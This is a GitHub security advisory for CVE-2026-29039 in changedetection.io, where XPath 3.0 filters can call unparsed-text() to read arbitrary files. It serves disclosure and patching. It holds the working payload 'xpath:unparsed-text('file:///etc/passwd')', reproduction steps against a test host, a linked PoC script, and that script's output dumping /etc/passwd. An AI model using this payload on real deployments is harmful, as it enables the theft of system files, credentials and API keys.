# [H] changedetection.io vulnerable to XPath - Arbitrary File Read via unparsed-text()

## Summary
Severity: High
Advisory: GHSA-6fmw-82m7-jq6p
CVE: CVE-2026-29039
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-6fmw-82m7-jq6p
Type: github-advisory

## Affected
- PyPI: `changedetection.io` — affected >=0 <0.54.4

## Details
### Summary
- The changedetection.io application allows users to specify XPath expressions as content filters via the include_filters field. These XPath expressions are processed using the elementpath library which implements XPath 3.0/3.1 specification.

- XPath 3.0 includes the unparsed-text() function which can read arbitrary files from the filesystem. The application does not validate or sanitize XPath expressions to block dangerous functions, allowing an attacker to read any file accessible to the application process.


### Data Flow

```
User Input (include_filters field)
    ↓
forms.py:ValidateCSSJSONXPATHInput() - Only validates syntax, NOT function safety
    ↓
Watch configuration stored in datastore
    ↓
Scheduled fetch triggers html_tools.py processing
    ↓
html_tools.py:xpath_filter() at line 213
    ↓
elementpath.select(root, xpath_expression, parser=XPath3Parser)
    ↓
XPath 3.0 unparsed-text('file:///etc/passwd') executed
    ↓
File contents returned as "filtered content"
    ↓
Stored as snapshot, viewable in UI

```

**Affected Code**
**File:** changedetectionio/html_tools.py
**Function:** xpath_filter()
**Lines:** 187-220

```
def xpath_filter(xpath_filter, html_content, append_pretty_line_formatting=False, is_rss=False):
    # ...
    from elementpath import XPath3Parser  # XPath 3.0 with dangerous functions
    # ...
    r = elementpath.select(root, xpath_filter.strip(), parser=XPath3Parser)  # Line 213

```

Validation (forms.py):

```
class ValidateCSSJSONXPATHInput:
    def __call__(self, form, field):
        # Only checks if XPath is syntactically valid
        # Does NOT check for dangerous functions like unparsed-text()

```

### Details

- Navigate to the http://ewn9c0k01ghh7f588a7mij4y1w6iz8gb.tryneoai.com:5000/ instance
- Create a new watch with any valid URL (e.g., https://example.com)
- Edit the watch and set the "CSS/JSONPath/JQ/XPath Filters" field to:

```
xpath:unparsed-text('file:///etc/passwd')
```

- Save and trigger a recheck
- View the preview/snapshot - the file contents will be displayed

<img width="2800" height="1108" alt="image" src="https://github.com/user-attachments/assets/f39df9c3-52c9-4fa8-ab57-75c7d4955017" />

### PoC

python script for easy reproduction: https://gist.githubusercontent.com/DhiyaneshGeek/27a6239f34023d43a0b89afb05edc5d2/raw/76d2b1f035164298d57699741eb79a8376f4ed47/poc_xpath_file_read.py

```
python3 poc_xpath_file_read.py http://ewn9c0k01ghh7f588a7mij4y1w6iz8gb.tryneoai.com:5000 /etc/passwd

╔═══════════════════════════════════════════════════════════════╗
║  XPath 3.0 Arbitrary File Read Exploit                        ║
║  Target: changedetection.io                                   ║
║  Vulnerability: unparsed-text() in XPath filters              ║
╚═══════════════════════════════════════════════════════════════╝
    
[*] Creating new watch for https://example.com...
[+] Watch created with UUID: 5215b704-809c-4218-952b-aad9b6ee41e1
[*] Setting XPath filter to read: /etc/passwd
[+] XPath filter set successfully
[*] Triggering recheck...
[*] Waiting for check to complete...
[*] Retrieving file contents...

[+] SUCCESS! File contents retrieved:
============================================================
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

============================================================
[*] Cleaning up (deleting watch)...

```


### Impact
- Read any file accessible to the application process
- Exfiltrate sensitive configuration files, credentials, API keys
- Read application source code
- Access database files if file-based (SQLite)

## References
- https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-6fmw-82m7-jq6p
- https://nvd.nist.gov/vuln/detail/CVE-2026-29039
- https://github.com/dgtlmoon/changedetection.io/commit/417d57e5749441e4be9acc4010369bded805d66f
- https://github.com/dgtlmoon/changedetection.io
- https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.4
